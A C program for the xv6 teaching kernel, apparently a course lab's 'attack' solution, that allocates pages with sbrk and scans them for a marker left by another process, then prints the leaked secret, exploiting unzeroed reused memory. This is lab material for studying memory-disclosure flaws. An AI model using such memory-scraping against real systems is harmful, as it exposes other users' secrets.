#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// The size of one memory page is 4096 bytes.
#define PGSIZE 4096

// Allocate a memory region of 32 pages.
#define DATASIZE (32 * PGSIZE)

int
main(int argc, char *argv[])
{
  char *data;

  // The marker written immediately before the secret string by secret.c.
  // We search for this marker to locate the secret in memory.
  char marker[] = "Here it is: ";
  int marker_len = strlen(marker);

  // Increase the process's memory size by DATASIZE bytes.
  // sbrk() returns (char *)-1 if the allocation fails.
  // The allocated pages may reuse physical pages previously freed
  // by another process, whose old contents may still remain.
  data = sbrk(DATASIZE);
  if (data == (char *)-1) {
    printf("attack: sbrk failed\n");
    exit(1);
  }

  // Scan the allocated memory region for the marker.
  // The loop condition prevents reading past the end of the region
  // while comparing the marker.
  for (int i = 0; i <= DATASIZE - marker_len; i++) {
    int j;

    // Compare each byte at the current position with the marker.
    for (j = 0; j < marker_len; j++) {
      if (data[i + j] != marker[j])
        break;
    }

    // If every character matches, the marker has been found.
    if (j == marker_len) {
      // The secret string starts immediately after the marker.
      char *secret = data + i + marker_len;
      int len = 0;

      // Find the length of the secret string by searching for '\0'.
      // Limit the scan to 128 bytes to avoid reading too far.
      while (len < 128 && secret[len] != '\0')
        len++;

      // Print the secret only if it is non-empty and a null terminator
      // was found within the 128-byte limit.
      if (len > 0 && len < 128) {
        // Write the secret to file descriptor 1 (standard output).
        write(1, secret, len);
        write(1, "\n", 1);

        // Exit successfully after finding and printing the secret.
        exit(0);
      }
    }
  }

  // The marker was not found in the allocated memory region.
  printf("attack: marker not found\n");
  exit(1);
}
